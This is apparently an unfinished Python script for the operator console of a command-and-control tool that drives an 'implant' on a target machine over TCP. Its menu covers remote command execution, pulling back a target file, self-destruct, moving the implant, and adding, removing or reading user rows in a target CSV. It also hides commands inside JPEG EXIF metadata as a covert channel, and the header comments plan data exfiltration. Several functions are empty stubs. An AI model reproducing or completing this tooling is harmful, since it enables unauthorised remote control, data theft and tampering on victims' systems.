#list commands for the implant 
#self destruct 
#fetch whole document 
#fetch new changes 
#add user/password mapping 
#delete user 
#get user 
#sleep 
#organize exfil of data 
import socket
import sys

import piexif
from PIL import Image


def add_custom_metadata(metadata, input_image_path="idFace.jpg", output_image_path="idFacex.jpg"):
    img = Image.open(input_image_path)
    exif_dict = piexif.load(img.info['exif'])

    # Add custom metadata
    exif_dict['0th'][piexif.ImageIFD.ImageDescription] = metadata.encode()

    exif_bytes = piexif.dump(exif_dict)
    img.save(output_image_path, exif=exif_bytes)


def sendCommand(msg: str, s: socket.socket):
    add_custom_metadata(msg)
    with open("idFacex.jpg", "rb") as img:
        data = img.read(1024)
        while data:
            s.sendall(data)
            data = img.read(1024)
    s.sendall("DONE".encode())
    # TODO change this to send the img file


def recieveResponse():
    pass


def destruct(s: socket.socket):  # TODO make it remove the scedule task
    sendCommand("DESTRUCT", s)
    print(s.recv(1024).decode())


def fetchAll(s: socket.socket):
    s.sendall("FETCHALL".encode())
    while True:
        data = s.recv(1024).decode()
        print(data)
        if data == "EOF":
            break


def addUser(s, args):
    pass


def removeUser(s, args):
    pass


def getUser(s, args):
    pass


def sleep(s, args):
    pass


def setPath(s, args):
    pass


def move(s, args):
    pass


def recon(s, command):
    s.sendall(" ".join(command).encode())
    data = s.recv(1024).decode()
    print(data)
    data = s.recv(1024).decode()
    print(data)


def printmenu():
    print("-------COMMAND OPTIONS------")
    print("RECON: Exicute command on target. Takes cmd as args. use dir")
    print("MOVE: move the implangt to a new location ")
    print("SETPATH: sets the path to the target file")
    print("DESTRUCT: remove the exploit from target")
    print("SLEEP: Make the implant turn off until ")  # TODO
    print("FETCHALL: send back the target file")
    print("ADDROW: adds a row(user) to the target csv file")
    print("REMOVEROW: removes a row(user) to the target csv file")
    print("GETROW: retrieves a row(user) from the target csv file")
    print("EXIT: turn off C2")


def commandAndControl(serverIP, serverPort):
    while True:
        print("type MENU for options.")
        command = input("Your wish is their command").split()
        args = command[1:]
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((serverIP, int(serverPort)))
            if command[0] == "DESTRUCT":
                destruct(s)
                s.close()
                exit()
            elif command[0] == "MENU":
                printmenu()
            elif command[0] == "EXIT":
                s.close()
                exit()
            elif command[0] == "RECON":
                recon(s, command)
            elif command[0] == "FETCHALL":
                fetchAll(s)
            elif command[0] == "MOVE":
                move(s)
            elif command == "SETPATH":
                setPath(s)
            elif command[0] == "ADDUSER":
                addUser(s, args)
            elif command[0] == "REMOVEUSER":
                removeUser(s, args)
            elif command[0] == "GETUSER":
                getUser(s, args)
            elif command[0] == "SLEEP":
                sleep(s, args)
                s.close()
                exit()
            else:
                print(f"{command} is not a proper command")


if __name__ == "__main__":
    serverIP = sys.argv[1]
    serverPort = sys.argv[2]
    commandAndControl(serverIP, serverPort)
